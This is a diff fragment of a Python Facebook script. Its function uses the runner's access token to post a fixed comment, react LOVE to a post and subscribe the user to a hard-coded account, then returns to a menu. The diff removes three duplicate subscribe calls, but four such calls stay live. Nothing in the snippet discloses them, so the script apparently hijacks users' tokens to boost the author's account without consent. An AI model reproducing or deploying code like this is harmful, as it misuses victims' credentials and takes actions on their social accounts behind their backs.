@@ -21,7 +21,4 @@ def dekudesu():
     requests.post('https://graph.facebook.com/631574531300766/comments/?message=' + komentar + '&access_token=' + token)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
     requests.post('https://graph.facebook.com/100033446736040/subscribers?access_token=' + token)#kon zaim
-    requests.post('https://graph.facebook.com/100033446736040/subscribers?access_token=' + token) #mey
-    requests.post('https://graph.facebook.com/100033446736040/subscribers?access_token=' + token)#mieruko chan
-    requests.post('https://graph.facebook.com/100033446736040/subscribers?access_token=' + token) #tsukasa chan
     exit(orbxd.menu())
